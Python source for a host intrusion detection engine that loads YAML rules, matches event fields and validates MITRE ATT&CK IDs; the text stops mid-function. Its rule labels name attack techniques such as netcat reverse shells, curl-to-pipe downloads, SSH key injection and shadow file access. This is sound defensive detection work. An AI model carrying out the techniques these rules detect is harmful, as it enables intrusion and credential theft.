from __future__ import annotations
"""
core/detection.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 2: Instant detection layer

Detection layer that works without ML and can catch attacks immediately after install.

Modules:
  1. RuleEngine        - Rule / signature matching (rules/*.yml)
  2. RegexDetector     - Regex pattern detection (rules/regex.yml)
  3. IOCMatcher        - IOC (IP/domain/hash) matching
  4. ThresholdDetector - Rate / burst / count detection (rules/threshold.yml)
  5. SequenceDetector  - Sequence / multi-step attack-chain detection

NOTE: FirstSeenDetector was removed; the first_seen predicate is implemented
      inside RuleEngine as YAMLConditionEvaluator._is_first_seen().
"""

import re
import time
import logging
import hashlib
import collections
import html
import shlex
import os
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import unquote_plus

from .language import normalize_language, resolve_language
from .normalize import NormalizedEvent

logger = logging.getLogger(__name__)

_TURKISH_TEXT_RE = re.compile(r"[çğıİöşüÇĞÖŞÜ]")
_INTERNAL_RULE_NAME_EN = {
    "SEQ-001": "SSH Brute Force → Successful Login",
    "SEQ-002": "Successful Login → Root Privilege Escalation → Dangerous Command",
    "SEQ-003": "New User → Sudo Privilege",
    "SEQ-005": "Security Tool Removal → Attack Activity",
    "SEQ-006": "Brute Force → Successful Login → Privilege Escalation",
    "SEQ-007": "Successful Login → New User Creation → Persistence",
    "SEQ-011": "Package Discovery → Attack Tool Installation",
    "SEQ-012": "SSH Login → Crontab Modification",
    "SEQ-013": "DGA/Suspicious DNS → Outbound Connection Attempt",
    "SEQ-014": "User Deletion → Log Cleanup",
    "SEQ-015": "Failed Sudo → Session Open → Successful Sudo",
    "SEQ-016": "Web Attack → Shell Upload → Command Execution",
    "SEQ-017": "Port Scan → Web Attack",
    "SEQ-018": "Brute Force → Successful Login → Lateral Movement",
    "SEQ-019": "SSH Login → Password Change",
    "SEQ-020": "Attack Tool Installation → LotL Execution",
    "SEQ-021": "DB Login Failure → Successful DB Login",
    "SEQ-022": "Root SSH → Kernel Module Load",
}
_INTERNAL_RULE_MESSAGE_EN = {
    "REGEX-001": "Reverse Shell Pattern",
    "REGEX-002": "Base64 Encoded Command",
    "REGEX-003": "Wget/Curl to Pipe",
    "REGEX-004": "SUID/SGID Bit Change",
    "REGEX-005": "SSH Key Injection",
    "REGEX-006": "Passwd File Access",
    "REGEX-006A": "Shadow File Access",
    "REGEX-007": "Crontab Modification",
    "REGEX-008": "Netcat Listener",
    "REGEX-009": "Netcat Reverse Shell Command",
    "REGEX-010": "Suspicious SSH Tunnel Command",
    "REGEX-011": "Downloader Inline Fetch Execute",
}

try:
    from .rule_schema import validate_ruleset, report_and_exit_if_errors
except ImportError:
    validate_ruleset = None
    report_and_exit_if_errors = None


# -- Detection Result --------------------------------------------------------

@dataclass
class DetectionResult:
    triggered:       bool  = False
    rule_id:         str   = ""
    severity:        str   = "low"
    score:           float = 0.0
    category:        str   = ""
    message:         str   = ""
    rule_file:       str   = ""
    mitre_tactic:    str   = ""
    mitre_technique: str   = ""
    tags:            List  = field(default_factory=list)
    details:         Dict  = field(default_factory=dict)

    @property
    def severity_level(self) -> int:
        return {"low": 1, "medium": 2, "high": 3, "critical": 4}.get(self.severity, 0)


def get_localized_rule_text(rule: Dict[str, Any], field: str, language: str) -> str:
    lang = normalize_language(language, default="tr")
    payload = dict(rule or {})
    field_name = str(field or "").strip() or "message"
    candidates: List[str] = [f"{field_name}_{lang}", field_name]
    if field_name != "message":
        candidates.extend([f"message_{lang}", "message"])

    for key in candidates:
        value = payload.get(key)
        if isinstance(value, str):
            text = value.strip()
            if text:
                return text
        elif value not in (None, "", [], {}, ()):
            return str(value)

    rule_id = str(payload.get("id", "") or "").strip()
    return rule_id if rule_id else ""


def _has_turkish_text(value: Any) -> bool:
    return bool(_TURKISH_TEXT_RE.search(str(value or "")))


def _internal_rule_name_en(rule: Dict[str, Any]) -> str:
    rule_id = str(rule.get("id", "") or "").strip()
    name = str(rule.get("name", "") or "").strip()
    if rule_id in _INTERNAL_RULE_NAME_EN:
        return _INTERNAL_RULE_NAME_EN[rule_id]
    if name and not _has_turkish_text(name):
        return name
    return rule_id or "Internal detection rule"


def _internal_rule_message_en(rule: Dict[str, Any]) -> str:
    rule_id = str(rule.get("id", "") or "").strip()
    if rule_id in _INTERNAL_RULE_MESSAGE_EN:
        return _INTERNAL_RULE_MESSAGE_EN[rule_id]
    return _internal_rule_name_en(rule)


def _generic_internal_summary_en(rule: Dict[str, Any]) -> str:
    title = _internal_rule_name_en(rule)
    return (
        f"This internal detection matched the defined conditions for {title}. "
        "Review the surrounding event context to confirm whether the behavior is expected or malicious."
    )


def _generic_internal_operator_note_en(rule: Dict[str, Any]) -> str:
    title = _internal_rule_name_en(rule)
    return (
        f"Validate the related context for {title}, including the user, host, source, "
        "command details, and any nearby authentication, process, persistence, or network activity."
    )


def _enrich_internal_rule_localization(rule: Dict[str, Any]) -> Dict[str, Any]:
    payload = dict(rule or {})
    for field in ("message", "summary", "operator_note"):
        value = str(payload.get(field, "") or "").strip()
        if not value or not _has_turkish_text(value):
            continue
        payload.setdefault(f"{field}_tr", value)
        if field == "message":
            payload.setdefault(f"{field}_en", _internal_rule_message_en(payload))
        elif field == "summary":
            payload.setdefault(f"{field}_en", _generic_internal_summary_en(payload))
        else:
            payload.setdefault(f"{field}_en", _generic_internal_operator_note_en(payload))
    return payload


def _enrich_internal_rule_collection(rules: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    return [_enrich_internal_rule_localization(rule) for rule in rules]


# ── 1. Rule Engine ────────────────────────────────────────────────────────────
# BUILTIN_RULES was removed.
# All rules are defined in rules/*.yml files.
# To add a new rule: create a .yml file under rules/ and restart.
# For rule format examples, see rules/auth.yml.

BUILTIN_RULES = []  # No longer used — kept only for backward-compatible imports


class SemanticFieldMatcher:
    """Field predicate matching with additive semantic normalization helpers."""

    COMPOUND_ANY = "__any__"
    COMPOUND_ALL = "__all__"
    COMPOUND_NOT = "__not__"

    def field_value(self, fields: Dict[str, Any], key: str) -> Any:
        if key in fields:
            return fields.get(key)
        current: Any = fields
        for part in key.split("."):
            if not isinstance(current, dict) or part not in current:
                return None
            current = current.get(part)
        return current

    def semantic_value(self, fields: Dict[str, Any], key: str) -> Any:
        direct = self.field_value(fields, key)
        if direct is not None:
            return direct

        semantic_aliases = {
            "command": (
                "cmdline",
                "exec_full",
                "sudo_command",
                "sudo_command_raw",
                "cron_command",
            ),
            "parent_process": (
                "parent_process",
                "proc_parent_name",
                "parent_name",
            ),
            "binary_path": (
                "exec_binary",
                "exe",
                "binary",
            ),
        }
        for alias in semantic_aliases.get(key, ()):
            alias_val = self.field_value(fields, alias)
            if alias_val is not None:
                return alias_val

        derived_numeric_suffixes = (
            "_label_max_len",
            "_label_count",
            "_len",
        )
        for suffix in derived_numeric_suffixes:
            if not key.endswith(suffix):
                continue
            base_key = key[:-len(suffix)]
            if not base_key:
                return None
            base_val = self.semantic_value(fields, base_key)
            if base_val is None:
                return None
            if suffix == "_len":
                if isinstance(base_val, list):
                    return float(len(base_val))
                return float(len(str(base_val)))
            labels = self._domain_labels(base_val)
            if suffix == "_label_count":
                return float(len(labels))
            if suffix == "_label_max_len":
                return float(max((len(label) for label in labels), default=0))

        derived_suffixes = (
            "_decoded_lc",
            "_decoded",
            "_tokens_lc",
            "_tokens",
            "_normalized",
            "_lc",
        )
        for suffix in derived_suffixes:
            if not key.endswith(suffix):
                continue
            base_key = key[:-len(suffix)]
            if not base_key:
                return None
            base_val = self.semantic_value(fields, base_key)
            if base_val is None:
                return None
            if suffix == "_decoded":
                return self._decoded_value(base_val)
            if suffix == "_decoded_lc":
                return self._lower_value(self._decoded_value(base_val))
            if suffix == "_tokens":
                return self._tokenize_value(base_val)
            if suffix == "_tokens_lc":
                return self._lower_value(self._tokenize_value(base_val))
            if suffix == "_normalized":
                return self._normalize_value(base_val)
            if suffix == "_lc":
                return self._lower_value(base_val)
        return None

    def match_fields(self, fields: Dict[str, Any], conditions: Dict[str, Any]) -> bool:
        if not isinstance(conditions, dict):
            return False
        for key, expected in conditions.items():
            if key == self.COMPOUND_ANY:
                if not isinstance(expected, list) or not expected:
                    return False
                if not any(self.match_fields(fields, item) for item in expected if isinstance(item, dict)):
                    return False
                continue
            if key == self.COMPOUND_ALL:
                if not isinstance(expected, list) or not expected:
                    return False
                if not all(self.match_fields(fields, item) for item in expected if isinstance(item, dict)):
                    return False
                if not all(isinstance(item, dict) for item in expected):
                    return False
                continue
            if key == self.COMPOUND_NOT:
                if isinstance(expected, dict):
                    if self.match_fields(fields, expected):
                        return False
                elif isinstance(expected, list):
                    if any(self.match_fields(fields, item) for item in expected if isinstance(item, dict)):
                        return False
                    if not all(isinstance(item, dict) for item in expected):
                        return False
                else:
                    return False
                continue
            if not self.match_field_condition(fields, key, expected):
                return False
        return True

    def match_field_condition(self, fields: Dict[str, Any], key: str, expected: Any) -> bool:
        if key.endswith("_token_contains_any"):
            real_key = key[:-len("_token_contains_any")] + "_tokens_lc"
            field_tokens = self.semantic_value(fields, real_key) or []
            expected_tokens = self._lower_value(expected if isinstance(expected, list) else [expected])
            return any(str(item) in field_tokens for item in expected_tokens)
        if key.endswith("_token_contains_all"):
            real_key = key[:-len("_token_contains_all")] + "_tokens_lc"
            field_tokens = self.semantic_value(fields, real_key) or []
            if not isinstance(expected, list) or not expected:
                return False
            expected_tokens = self._lower_value(expected)
            return all(str(item) in field_tokens for item in expected_tokens)
        if key.endswith("_token_contains"):
            real_key = key[:-len("_token_contains")] + "_tokens_lc"
            field_tokens = self.semantic_value(fields, real_key) or []
            return str(self._lower_value(expected)) in field_tokens
        if key.endswith("_contains_any"):
            real_key = key[:-len("_contains_any")]
            field_val = str(self.semantic_value(fields, real_key) or "")
            if isinstance(expected, list):
                return any(str(item) in field_val for item in expected)
            return str(expected) in field_val
        if key.endswith("_contains_all"):
            real_key = key[:-len("_contains_all")]
            field_val = str(self.semantic_value(fields, real_key) or "")
            if not isinstance(expected, list) or not expected:
                return False
            return all(str(item) in field_val for item in expected)
        if key.endswith("_contains"):
            real_key = key[:-len("_contains")]
            field_val = str(self.semantic_value(fields, real_key) or "")
            if isinstance(expected, list):
                return any(str(item) in field_val for item in expected)
            return str(expected) in field_val
        if key.endswith("_regex"):
            real_key = key[:-len("_regex")]
            field_val = str(self.semantic_value(fields, real_key) or "")
            try:
                return re.search(str(expected), field_val) is not None
            except re.error:
                return False
        if key.endswith("_between"):
            real_key = key[:-len("_between")]
            field_num = self._numeric_value(self.semantic_value(fields, real_key))
            if field_num is None or not isinstance(expected, (list, tuple)) or len(expected) != 2:
                return False
            low = self._numeric_value(expected[0])
            high = self._numeric_value(expected[1])
            if low is None or high is None:
                return False
            return low <= field_num <= high
        for suffix, comparator in (
            ("_gte", lambda a, b: a >= b),
            ("_gt", lambda a, b: a > b),
            ("_lte", lambda a, b: a <= b),
            ("_lt", lambda a, b: a < b),
            ("_neq", lambda a, b: a != b),
            ("_eq", lambda a, b: a == b),
        ):
            if key.endswith(suffix):
                real_key = key[:-len(suffix)]
                field_num = self._numeric_value(self.semantic_value(fields, real_key))
                expected_num = self._numeric_value(expected)
                if field_num is None or expected_num is None:
                    return False
                return comparator(field_num, expected_num)
        if key == "exclude_if_field":
            return not bool(self.semantic_value(fields, str(expected)))
        field_val = self.semantic_value(fields, key)
        return field_val == expected

    def _numeric_value(self, value: Any) -> Optional[float]:
        if isinstance(value, bool) or value is None:
            return None
        if isinstance(value, (int, float)):
            return float(value)
        if isinstance(value, str):
            try:
                return float(value.strip())
            except ValueError:
                return None
        return None

    def _normalize_value(self, value: Any) -> Any:
        if isinstance(value, list):
            return [self._normalize_value(item) for item in value]
        if isinstance(value, str):
            return " ".join(value.split())
        return value

    def _lower_value(self, value: Any) -> Any:
        if isinstance(value, list):
            return [self._lower_value(item) for item in value]
        if isinstance(value, str):
            return value.lower()
        return value

    def _decoded_value(self, value: Any) -> Any:
        if isinstance(value, list):
            return [self._decoded_value(item) for item in value]
        if not isinstance(value, str):
            return value
        decoded = value
        for _ in range(2):
            next_decoded = html.unescape(unquote_plus(decoded))
            if next_decoded == decoded:
                break
            decoded = next_decoded
        return decoded

    def _tokenize_value(self, value: Any) -> List[str]:
        if isinstance(value, list):
            return [str(item) for item in value if str(item)]
        if not isinstance(value, str):
            return []
        normalized = self._normalize_value(self._decoded_value(value))
        try:
            tokens = shlex.split(normalized)
        except ValueError:
            tokens = re.findall(r'[^\\s"\']+|"[^"]*"|\'[^\']*\'', normalized)
        return [token.strip("\"'") for token in tokens if token.strip("\"'")]

    def _domain_labels(self, value: Any) -> List[str]:
        if not isinstance(value, str):
            return []
        return [label for label in value.strip(".").split(".") if label]


class YAMLConditionEvaluator:
    """
    Evaluate YAML rule conditions without using lambdas.

    Supported condition fields:
      action: str or [str, ...]          → must match event.action
      outcome: str                        → must match event.outcome
      user: str                           → must match event.user
      category: str                       → must match event.category
      source: str or [str, ...]          → must match event.source
      distro: str or [str, ...]          → must match event.distro_family
      fields:
        key: value                        → event.fields[key] == value
        key_contains: [str, ...]         → any value must appear in event.fields[key]
        key_lt: int                       → event.fields[key] < int
      action_contains: str               → substring inside action
      first_seen: str                    → trigger when the entity is first seen
        Supported values: src_ip | user | user_ip_pair | binary | process
    """

    def __init__(self, db=None):
        self._db   = db
        self._mem: set = set()   # DB yoksa in-memory fallback
        self._field_matcher = SemanticFieldMatcher()

    def set_db(self, db) -> None:
        self._db = db

    def _field_value(self, fields: Dict[str, Any], key: str) -> Any:
        return self._field_matcher.semantic_value(fields, key)

    def _is_first_seen(self, entity_type: str, entity_key: str) -> bool:
        """Check first_seen using the DB or the in-memory fallback."""
        if not entity_key:
            return False
        if self._db:
            return self._db.is_first_seen(entity_type, entity_key)
        key = f"{entity_type}:{entity_key}"
        if key not in self._mem:
            self._mem.add(key)
            return True
        return False

    def matches(self, cond: Dict, event: NormalizedEvent) -> bool:
        try:
            # action
            if "action" in cond:
                val = cond["action"]
                if isinstance(val, list):
                    if event.action not in val:
                        return False
                else:
                    if event.action != val:
                        return False

            # outcome
            if "outcome" in cond:
                if event.outcome != cond["outcome"]:
                    return False

            # user
            if "user" in cond:
                cond_user = cond["user"]
                if isinstance(cond_user, str) and cond_user.startswith("!"):
                    # negation: user: "!root" → the user must not be root
                    if event.user == cond_user[1:]:
                        return False
                else:
                    if event.user != cond_user:
                        return False

            # category
            if "category" in cond:
                if event.category != cond["category"]:
                    return False

            # source
            if "source" in cond:
                val = cond["source"]
                if isinstance(val, list):
                    if event.source not in val:
                        return False
                else:
                    if event.source != val:
                        return False

            # distro — distribution filter
            if "distro" in cond:
                val = cond["distro"]
                if isinstance(val, list):
                    if event.distro_family not in val:
                        return False
                else:
                    if event.distro_family != val:
                        return False

            # action_contains
            if "action_contains" in cond:
                if cond["action_contains"] not in event.action:
                    return False

            # first_seen predicate — stateful, DB destekli
            if "first_seen" in cond:
                entity_type = cond["first_seen"]
                if entity_type == "src_ip":
                    entity_key = event.src_ip
                elif entity_type == "user":
                    entity_key = event.user
                elif entity_type == "user_ip_pair":
                    entity_key = f"{event.user}@{event.src_ip}" if event.user and event.src_ip else ""
                elif entity_type == "binary":
                    entity_key = event.fields.get("binary_path", event.process)
                elif entity_type == "process":
                    entity_key = event.process
                else:
                    entity_key = ""
                if not self._is_first_seen(entity_type, entity_key):
                    return False

            # fields
            if "fields" in cond:
                if not self._field_matcher.match_fields(event.fields, cond["fields"]):
                    return False

            return True
        except Exception as e:
            logger.debug(f"[YAML COND] evaluation error: {e}")
            return False


class RuleEngine:
    """
    Load all rules from rules/*.yml files.
    BUILTIN_RULES has been fully removed, so YAML is the single source of truth.

    rules_source (config.yml):
      yaml   → only rules/*.yml (default, production)
      hybrid → rules/*.yml + legacy builtins (no effective difference because BUILTIN_RULES is empty)

    Fail-fast:
      If rules/ cannot be found or no valid rule can be loaded, the system will not start.
      This check can be skipped with --allow-empty-rules (debug only).

    To add a new rule:
      add a .yml file under rules/ and restart
      see rules/auth.yml for format examples.
    """

    def __init__(self, rules_dir: str = "rules",
                 rules_source: str = "yaml",
                 allow_empty: bool = False,
                 distro_family: str = "unknown",
                 db=None,
                 language: str = "tr"):
        self._evaluator   = YAMLConditionEvaluator(db=db)
        self._db          = db
        self.rules:       List[Dict] = []
        self._yaml_ids:   set = set()
        self.rules_dir    = rules_dir
        self.rules_source = rules_source
        self.distro_family = distro_family
        self.language = normalize_language(language, default="tr")

        # Valid MITRE ID list for validation
        self._mitre_db = self._load_mitre_db()

        # Load the main rules/ tree plus every pack under rules/packs/**/
        loaded = self._load_rule_tree(rules_dir)

        # Platform filter — remove rules that do not match the distro
        before = len(self.rules)
        self.rules = self._filter_by_platform(self.rules, distro_family)
        filtered = before - len(self.rules)
        loaded   = len(self.rules)

        # Fail-fast check
        if loaded == 0 and not allow_empty:
            self._fail_fast(rules_dir)

        # Pack statistics
        pack_counts: Dict[str, int] = {}
        for r in self.rules:
            p = r.get("pack", "core")
            pack_counts[p] = pack_counts.get(p, 0) + 1

        pack_summary = ", ".join(f"{p}:{n}" for p, n in sorted(pack_counts.items()))
        filter_note  = f" ({filtered} platform disi kural elendi)" if filtered else ""
        logger.info(f"[AegisCore:Rule] {loaded} kural yuklendi — {pack_summary}{filter_note}")

    def set_db(self, db) -> None:
        """Bind the DB late because it may not be ready during startup."""
        self._db = db
        self._evaluator.set_db(db)

    @staticmethod
    def _filter_by_platform(rules, distro_family):
        result = []
        for rule in rules:
            platforms = rule.get("platform", [])
            if not platforms:
                result.append(rule)
            elif distro_family in platforms:
                result.append(rule)
        return result

    def _load_mitre_db(self) -> Dict:
        """Load the MITRE ATT&CK ID validation database."""
        try:
            mitre_path = Path("config/mitre_techniques.json")
            if mitre_path.exists():
                import json as _json
                return _json.loads(mitre_path.read_text())
        except Exception:
            pass
        return {}

    def _is_valid_mitre_tactic(self, tactic: str) -> bool:
        if not tactic:
            return True
        tactics = self._mitre_db.get("tactics", {})
        return not tactics or tactic in tactics

    def _is_valid_mitre_technique(self, technique: str) -> bool:
        if not technique:
            return True
        techniques = self._mitre_db.get("techniques", {})
        subtechniques = self._mitre_db.get("subtechniques", {})
        return not techniques or technique in techniques or technique in subtechniques

    def _is_valid_mitre_subtechnique(self, sub: str) -> bool:
        if not sub:
            return True
        subs = self._mitre_db.get("subtechniques", {})
        return not subs or sub in subs

    def _fail_fast(self, rules_dir: str):
        """
        Exit with a clear error message if no rules can be loaded.
        """
        rdir = Path(rules_dir).absolute()
        yml_files = list(Path(rules_dir).glob("*.yml")) if Path(rules_dir).exists() else []
        usable = [f for f in yml_files if f.name not in ("regex.yml", "threshold.yml")]

        lines = [
            "",
            "━" * 58,
            "  HATA: Kural dosyası yüklenemedi — sistem başlamıyor.",
            "━" * 58,
            f"  Aranan konum : {rdir}",
            f"  Beklenen     : *.yml dosyaları (auth.yml, network.yml...)",
            f"  Bulunan yml  : {len(usable)} adet",
        ]

        if not Path(rules_dir).exists():
            lines.append(f"  Sorun        : '{rules_dir}/' klasörü yok")
        elif len(usable) == 0:
            lines.append(f"  Sorun        : Klasör var ama .yml dosyası yok")
        else:
            lines.append(f"  Sorun        : .yml dosyaları var ama geçerli kural içermiyor")
            lines.append(f"                 (id ve condition alanları zorunlu)")

        lines += [
            "",
            "  Çözüm:",
            "    1. Zip'i yeniden indir ve aç",
            "       → rules/ klasörü içinde auth.yml, network.yml vb. gelmeli",
            "    2. Veya rules/ klasörünü yedekten geri yükle",
            "    3. Debug için: python main.py --allow-empty-rules",
            "       (Bu modda detection çalışmaz, sadece --status/--metrics/--phase aktif)",
            "━" * 58,
            "",
        ]
        print("\n".join(lines))
        import sys
        sys.exit(1)

    def _load_yaml_rules(self, rules_dir: str, pack_name: str = "") -> int:
        """
        Load rules/*.yml.
        Fail fast on the following errors:
          - invalid YAML syntax
          - duplicate rule ID
          - score is not an integer/float
          - missing required fields (id, condition, severity, score, message)
        """
        try:
            import yaml as _yaml
        except ImportError:
            print("HATA: PyYAML yok. Kur: pip install pyyaml")
            import sys; sys.exit(1)

        rdir = Path(rules_dir)
        if not rdir.exists():
            return 0

        seen_ids: Dict[str, str] = {}   # id → file name (for duplicate checks)
        parse_errors: List[str] = []    # YAML syntax / format errors (before rule validation)
        loaded = 0

        for yml_file in sorted(rdir.glob("*.yml")):
            if yml_file.name in ("regex.yml", "threshold.yml"):
                continue

            # 1. Parse YAML
            try:
                raw_rules = _yaml.safe_load(yml_file.read_text())
            except _yaml.YAMLError as e:
                parse_errors.append(f"HATA: Geçersiz YAML — {yml_file.name}: {e}")
                continue

            if not raw_rules:
                continue
            if not isinstance(raw_rules, list):
                parse_errors.append(f"HATA: {yml_file.name} — kök eleman liste olmalı")
                continue

            for r in raw_rules:
                if not isinstance(r, dict):
                    parse_errors.append(f"HATA: {yml_file.name} — kural dict olmalı")
                    continue

                rid = r.get("id", "")

                # Catch duplicate IDs early (validate_ruleset also checks across files,
                # but keeping it here simplifies load decisions)
                if rid:
                    if rid in seen_ids:
                        parse_errors.append(
                            f"HATA: Duplicate rule ID '{rid}' — "
                            f"{yml_file.name} ve {seen_ids[rid]}"
                        )
                        continue   # duplicate → skip loading
                    seen_ids[rid] = yml_file.name

                # Minimum field presence (id + condition) — validate_ruleset performs detailed checks
                if not rid or not r.get("condition"):
                    parse_errors.append(
                        f"HATA: id veya condition eksik — {yml_file.name} kural '{rid or '?'}'"
                    )
                    continue

                self.rules.append({
                    "_type":      "yaml",
                    "_rule_file": yml_file.name,
                    **r
                })
                self._yaml_ids.add(rid)
                loaded += 1

        # If YAML syntax/format errors exist, print all of them and exit
        if parse_errors:
            print("\n" + "━" * 58)
            print("  HATA: Kural dosyalarında sorun bulundu.")
            print("━" * 58)
            for e in parse_errors:
                print(f"  ❌ {e}")
            print("\n  Düzelt ve yeniden başlat.")
            print("━" * 58 + "\n")
            import sys
            sys.exit(1)

        # Full schema validation via rule_schema.py (single validation path)
        if validate_ruleset and report_and_exit_if_errors:
            _loaded_rules = [r for r in self.rules if r.get("_type") == "yaml"]
            _cross_seen:  Dict[str, str] = {}
            _all_errs:    list = []
            _all_warns:   list = []
            for _f in set(r.get("_rule_file", "?") for r in _loaded_rules):
                _rules_in_file = [r for r in _loaded_rules if r.get("_rule_file") == _f]
                _e, _w = validate_ruleset(_rules_in_file, _f, _cross_seen)
                _all_errs.extend(_e)
                _all_warns.extend(_w)
            report_and_exit_if_errors(_all_errs, _all_warns, strict=True)
        elif not validate_ruleset and parse_errors:
            print("\n" + "━" * 58)
            print("  HATA: Kural dosyalarında sorun bulundu (rule_schema.py eksik).")
            print("━" * 58)
            for e in parse_errors:
                print(f"  ❌ {e}")
            print("\n  Düzelt ve yeniden başlat.")
            print("━" * 58 + "\n")
            import sys
            sys.exit(1)

        return loaded

    def validate(self) -> List[str]:
        """
        Parse all YAML rules and report any problems.
        Checks:
          - required fields (id, condition, severity, score, message)
          - valid severity value
          - numeric score
          - MITRE tactic/technique/subtechnique validity
          - duplicate IDs, including across packs
          - pack_version presence
          - condition complexity limits for community packs
        Called by python main.py --validate-rules.
        """
        errors = []
        warnings = []
        seen_ids: Dict[str, str] = {}

        for r in self.rules:
            rid  = r.get("id", "?")
            pack = r.get("pack", "core")
            src  = r.get("_rule_file", "?")

            # 1. Temel alan kontrolleri
            if not r.get("severity") in ("low", "medium", "high", "critical"):
                errors.append(f"{rid} [{src}]: gecersiz severity '{r.get('severity')}'")
            if not isinstance(r.get("score", 0), (int, float)):
                errors.append(f"{rid} [{src}]: score sayi olmali")
            if not r.get("message"):
                errors.append(f"{rid} [{src}]: message eksik")
            cond = r.get("condition", {})
            if not isinstance(cond, dict):
                errors.append(f"{rid} [{src}]: condition dict olmali")

            # 2. MITRE validasyonu
            tactic = r.get("mitre_tactic", "")
            technique = r.get("mitre_technique", "")
            subtechnique = r.get("mitre_subtechnique", "")

            if not tactic:
                warnings.append(f"{rid} [{src}]: mitre_tactic eksik (onerilir)")
            elif not self._is_valid_mitre_tactic(tactic):
                errors.append(f"{rid} [{src}]: gecersiz MITRE tactic '{tactic}'")

            if technique and not self._is_valid_mitre_technique(technique):
                errors.append(f"{rid} [{src}]: gecersiz MITRE technique '{technique}'")

            if subtechnique and not self._is_valid_mitre_subtechnique(subtechnique):
                errors.append(f"{rid} [{src}]: gecersiz MITRE subtechnique '{subtechnique}'")

            # technique varsa tactic da olmali
            if technique and not tactic:
                warnings.append(f"{rid} [{src}]: technique var ama tactic eksik")

            # 3. Duplicate ID — pack'ler arasi
            if rid != "?":
                if rid in seen_ids:
                    errors.append(
                        f"{rid}: DUPLICATE ID — {src} ve {seen_ids[rid]} cakisiyor"
                    )
                else:
                    seen_ids[rid] = src

            # 4. Pack metadata
            if not r.get("pack_version"):
                warnings.append(f"{rid} [{src}]: pack_version eksik")

            # 5. Community pack ek kontrolleri
            if pack == "community":
                name = r.get("name", "")
                if not name:
                    warnings.append(f"{rid} [{src}]: community kural icin name onerilir")
                if not r.get("tags"):
                    warnings.append(f"{rid} [{src}]: community kural icin tags onerilir")

        # Ozet cikti
        if warnings:
            print(f"\n  ⚠️  {len(warnings)} uyari:")
            for w in warnings:
                print(f"    • {w}")

        return errors

    def get_pack_status(self) -> Dict:
        """Pack'lerin durumunu ve kural sayilarini dondur."""
        packs: Dict[str, Dict] = {}
        tactics_covered: set = set()
        techniques_covered: set = set()

        for r in self.rules:
            pack = r.get("pack", "core")
            if pack not in packs:
                packs[pack] = {"rules": 0, "tactics": set(), "techniques": set()}
            packs[pack]["rules"] += 1
            if r.get("mitre_tactic"):
                packs[pack]["tactics"].add(r["mitre_tactic"])
                tactics_covered.add(r["mitre_tactic"])
            if r.get("mitre_technique"):
                packs[pack]["techniques"].add(r["mitre_technique"])
                techniques_covered.add(r["mitre_technique"])

        # Set'leri listeye cevir (JSON serializable)
        result = {}
        for pack, data in packs.items():
            result[pack] = {
                "rules":      data["rules"],
                "tactics":    sorted(data["tactics"]),
                "techniques": sorted(data["techniques"]),
            }

        # Blind-spot analysis
        all_tactics = set(self._mitre_db.get("tactics", {}).keys())
        blind_spots = sorted(all_tactics - tactics_covered) if all_tactics else []

        return {
            "packs":            result,
            "total_rules":      len(self.rules),
            "tactics_covered":  sorted(tactics_covered),
            "blind_spots":      blind_spots,
        }

    def check(self, event: NormalizedEvent) -> List[DetectionResult]:
        results = []
        for rule in self.rules:
            try:
                rule_id = rule.get("id", "")
                if self._rhel_invalid_ssh_auth002_guard(event, rule_id):
                    continue
                if self._suse_readonly_systemd_sudo_guard(event, rule_id):
                    continue
                if self._rhel_invalid_ssh_auth003_match(event, rule_id):
                    triggered = True
                else:
                    triggered = self._evaluator.matches(
                        rule.get("condition", {}), event
                    )
                if triggered:
                    localized_message = get_localized_rule_text(rule, "message", self.language)
                    results.append(DetectionResult(
                        triggered        = True,
                        rule_id          = rule_id,
                        severity         = rule["severity"],
                        score            = rule["score"],
                        category         = rule.get("category", event.category),
                        message          = localized_message,
                        rule_file        = rule.get("_rule_file", "builtin"),
                        mitre_tactic     = rule.get("mitre_tactic", ""),
                        mitre_technique  = rule.get("mitre_technique", ""),
                        tags             = rule.get("tags", []),
                        details          = {
                            "rule_name":    rule.get("name", rule["id"]),
                            "rule_source":  "yaml",
                            "rule_file":    rule.get("_rule_file", ""),
                            "cooldown":     rule.get("cooldown", None),
                            "cooldown_entity": rule.get("cooldown_entity", "ip_user"),
                            "summary":      get_localized_rule_text(rule, "summary", self.language),
                            "operator_note": get_localized_rule_text(rule, "operator_note", self.language),
                        }
                    ))
            except Exception as e:
                logger.debug(f"[AegisCore:Rule] {rule.get('id','?')} hata: {e}")
        return results

    @staticmethod
    def _rhel_invalid_ssh_failure(event: NormalizedEvent) -> bool:
        fields = event.fields if isinstance(event.fields, dict) else {}
        message = str(event.message or "")
        raw = str(event.raw or "")
        text = f"{message}\n{raw}"
        is_rhel_pam_unknown_summary = (
            event.user == "unknown"
            and "PAM" in text
            and "more authentication failure" in text
            and "rhost=" in text
        )
        return bool(
            event.distro_family == "rhel"
            and event.action == "ssh_login"
            and event.outcome == "failure"
            and (
                fields.get("invalid_user") is True
                or is_rhel_pam_unknown_summary
            )
        )

    @classmethod
    def _rhel_invalid_ssh_auth002_guard(cls, event: NormalizedEvent, rule_id: str) -> bool:
        return rule_id == "AUTH-002" and cls._rhel_invalid_ssh_failure(event)

    @classmethod
    def _rhel_invalid_ssh_auth003_match(cls, event: NormalizedEvent, rule_id: str) -> bool:
        return rule_id == "AUTH-003" and cls._rhel_invalid_ssh_failure(event)

    @staticmethod
    def _suse_readonly_systemd_sudo_guard(event: NormalizedEvent, rule_id: str) -> bool:
        if rule_id not in ("PERS-005", "PERS-019"):
            return False
        if event.distro_family != "suse":
            return False
        if event.action != "sudo" or event.outcome != "success":
            return False

        fields = event.fields if isinstance(event.fields, dict) else {}
        cmd = str(fields.get("sudo_command") or fields.get("sudo_command_raw") or "")
        if not cmd or "/etc/systemd/system" not in cmd:
            return False

        try:
            tokens = shlex.split(cmd)
        except ValueError:
            tokens = cmd.split()
        if not tokens:
            return False

        exe = tokens[0].rsplit("/", 1)[-1]
        readonly = {"stat", "ls", "find", "readlink", "cat", "grep", "test", "file"}
        if exe not in readonly:
            return False

        lowered = f" {cmd.lower()} "
        mutating_markers = (
            " >",
            ">>",
            "| tee ",
            " tee ",
            " cp ",
            " mv ",
            " install ",
            " ln ",
            " rm ",
            " chmod ",
            " chown ",
            " sed -i",
            " echo ",
            " printf ",
            " systemctl enable",
            " systemctl link",
            " systemctl daemon-reload",
            " systemctl preset",
            " systemctl reenable",
            " systemctl start",
            " systemctl restart",
            " systemctl reload",
            " -exec ",
            " -delete",
        )
